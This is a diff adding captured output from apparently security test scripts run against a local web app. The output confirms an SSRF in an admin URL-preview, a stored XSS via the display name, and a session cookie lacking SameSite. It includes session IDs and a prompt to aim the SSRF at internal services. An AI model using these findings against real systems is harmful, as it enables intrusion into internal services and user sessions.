@@ -1,0 +1,29 @@
+# Task 3 — captured run output (Fri Jul 31 12:17:44 WCAST 2026)
+
+## SSRF via admin URL-preview (node tests/ssrf-demo.mjs)
+```
+Logged in as admin; session cookie acquired.
+
+Asking the SERVER to fetch: http://127.0.0.1:3000/login
+HTTP status of preview call: 200
+Server fetched status: 200 OK
+Returned body snippet (first 200 chars):
+  <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1785496
+
+[SSRF CONFIRMED] The server followed a loopback URL and returned its body — no host/scheme/IP restrictions are applied. Point this at any internal service to read it.
+```
+
+## Stored-XSS round-trip (payload saved as display name, echoed unescaped on /dashboard)
+```
+Logged in; cookie: sid=8e5ca923-b9e5-4764-b8ec-49ecfd01270b
+Profile save status: 303 (303 redirect expected)
+Dashboard contains RAW payload unescaped: true
+Dashboard contains ESCAPED (&lt;img) version: false
+[STORED XSS CONFIRMED] display_name is rendered as raw HTML on /dashboard.
+Restored display name to 'Ada Learner'.
+```
+
+## No-SameSite session cookie (Set-Cookie from login has no SameSite attribute)
+```
+Set-Cookie: sid=a1e20afc-fb96-42dc-abd3-1eeadb858044; Path=/; HttpOnly; Max-Age=86400
+```
